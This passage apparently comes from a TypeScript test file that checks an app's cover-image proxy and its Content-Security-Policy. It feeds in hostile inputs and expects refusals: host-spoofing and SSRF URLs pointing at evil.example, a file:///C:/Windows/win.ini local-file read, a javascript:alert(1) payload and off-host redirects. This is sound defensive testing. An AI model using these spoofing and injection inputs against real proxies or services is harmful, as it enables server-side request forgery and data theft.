  [proxied("https://occ-0-1.nflxext.com/a.jpg"), "GET", "https://www.netflix.com/"],
  [proxied("https://i0.hdslb.com/a.jpg"), "POST", 405],
  [proxied("https://i0.hdslb.com/a.jpg"), "HEAD", 405],
  [proxied("http://i0.hdslb.com/a.jpg"), "GET", 403],
  [proxied("https://i0.hdslb.com.evil.example/a.jpg"), "GET", 403],
  [proxied("https://evilhdslb.com/a.jpg"), "GET", 403],
  [proxied("https://hdslb.com@evil.example/a.jpg"), "GET", 403],
  [proxied("https://user:pw@i0.hdslb.com/a.jpg"), "GET", 403],
  [proxied("https://i0.hdslb.com:8443/a.jpg"), "GET", 403],
  [proxied("https://evil.example/?https://i0.hdslb.com/a.jpg"), "GET", 403],
  [proxied("https://www.bilibili.com/video/BV1GJ411x7h7"), "GET", 403],
  [proxied("file:///C:/Windows/win.ini"), "GET", 403],
  [proxied("javascript:alert(1)"), "GET", 403],
  ["mcode-media://proxy/", "GET", 400],
  ["mcode-media://elsewhere/?u=" + encodeURIComponent("https://i0.hdslb.com/a.jpg"), "GET", 400],
  ["https://i0.hdslb.com/a.jpg", "GET", 400],
  ["not a url", "GET", 400],
]
for (const [address, method, want] of COVER_REQUESTS) {
  const asked = coverRequest(address, method)
  const got = asked.ok ? asked.referer : asked.status
  if (got !== want) problems.push(`cover: ${method} ${address} gave ${got}, not ${want}`)
}
const COVER_REDIRECTS: [string, string | null, boolean][] = [
  ["https://i0.hdslb.com/a.jpg", "https://i1.hdslb.com/b.jpg", true],
  ["https://i0.hdslb.com/a.jpg", "/b.jpg", true],
  ["https://i0.hdslb.com/a.jpg", "https://evil.example/b.jpg", false],
  ["https://i0.hdslb.com/a.jpg", "//evil.example/b.jpg", false],
  ["https://i0.hdslb.com/a.jpg", "http://i1.hdslb.com/b.jpg", false],
  ["https://i0.hdslb.com/a.jpg", "https://i1.hdslb.com.evil.example/b.jpg", false],
  ["https://i0.hdslb.com/a.jpg", null, false],
]
for (const [from, location, want] of COVER_REDIRECTS) if (Boolean(coverRedirect(from, location)) !== want) problems.push(`cover: a redirect from ${from} to ${location} ${want ? "was refused" : "was followed"}`)
const COVER_ANSWERS: [number, string | null, string | null, string | undefined][] = [
  [200, "image/jpeg", "1024", "image/jpeg"],
  [200, "IMAGE/WEBP; charset=binary", null, "image/webp"],
  [206, "image/png", String(COVER_LIMIT), "image/png"],
  [200, "image/png", String(COVER_LIMIT + 1), undefined],
  [200, "image/png", "lots", undefined],
  [200, "image/svg+xml", "10", undefined],
  [200, "text/html", "10", undefined],
  [200, "application/octet-stream", "10", undefined],
  [200, null, "10", undefined],
  [200, "image/", "10", undefined],
  [404, "image/png", "10", undefined],
  [302, "image/png", "10", undefined],
]
for (const [status, type, length, want] of COVER_ANSWERS) if (coverAnswer(status, type, length) !== want) problems.push(`cover: a ${status} ${type} of ${length} bytes gave ${coverAnswer(status, type, length)}, not ${want}`)
if (coverProxyAddress("http://i0.hdslb.com/a.jpg") !== proxied("https://i0.hdslb.com/a.jpg")) problems.push("cover: an http cover was not proxied as https")
if (coverProxyAddress("https://evil.example/a.jpg") !== "") problems.push("cover: a cover off the host list got a proxy address")
const directCover = readMediaMeta({ kind: "video", platform: "youtube", url: "https://youtu.be/dQw4w9WgXcQ", title: "x", coverUrl: "https://i.ytimg.com/vi/x/hqdefault.jpg", aspect: "16:9" })
if (directCover?.coverUrl !== "") problems.push("cover: a card kept a cover that bypasses the proxy")
const offListCover = readMediaMeta({ kind: "video", platform: "youtube", url: "https://youtu.be/dQw4w9WgXcQ", title: "x", coverUrl: proxied("https://evil.example/a.jpg"), aspect: "16:9" })
if (offListCover?.coverUrl !== "") problems.push("cover: a card kept a proxy address to a host off the list")

/* The content policy's frames: the page preview alone. A card opens the browser panel, so no platform page is ever framed. */
const indexPage = fs.readFileSync(path.join(process.cwd(), "src/renderer/index.html"), "utf8")
const policy = /http-equiv="Content-Security-Policy"\s+content="([^"]*)"/.exec(indexPage)?.[1] ?? ""
const frameSources = (/(?:^|;)\s*frame-src ([^;]*)/.exec(policy)?.[1] ?? "").trim().split(/\s+/)
const webFrames = frameSources.filter((source) => source !== "'self'" && source !== "http://*.localhost:*")
if (!frameSources.includes("'self'") || webFrames.length) problems.push(`csp: frame-src allows ${webFrames.join(" ")} beyond the app and the page preview`)
const imageSources = (/(?:^|;)\s*img-src ([^;]*)/.exec(policy)?.[1] ?? "").trim().split(/\s+/)
if (!imageSources.includes("mcode-media:")) problems.push("csp: img-src does not allow the cover proxy")
if (/(?:^|;)\s*(?:connect|frame|script|media)-src [^;]*mcode-media:/.test(policy)) problems.push("csp: the cover proxy is allowed for more than images")
inspect("a platform link in a reply", htmlOf("watch https://www.youtube.com/watch?v=dQw4w9WgXcQ and [this](https://www.bilibili.com/video/BV1GJ411x7h7)", REPLY))

console.log(`abc cases: ${ABC_HOSTILE.length * (OPTIONS.length + 3) + abcBlockCases.length + 1}, platform cases: ${PLATFORM_LINKS.length + 5}, cover proxy cases: ${COVER_REQUESTS.length + COVER_REDIRECTS.length + COVER_ANSWERS.length + 6}`)
console.log(`live cases: ${liveCases.length + 1}, svg card cases: ${SVG_FILES.length + 6}`)
console.log(`hostile inputs: ${HOSTILE.length} x ${OPTIONS.length + 1} option sets, svg pre-pass cases: ${SVG_CASES.length}, formatting cases: ${shape.length + blockCases.length + PATHS.length}`)

if (problems.length) {
  console.error(`\nFAILED with ${problems.length} problem(s):`)
  for (const problem of problems) console.error("  " + problem)
  process.exit(1)
}
console.log("Nothing a model writes becomes markup, and the formatting still works.")
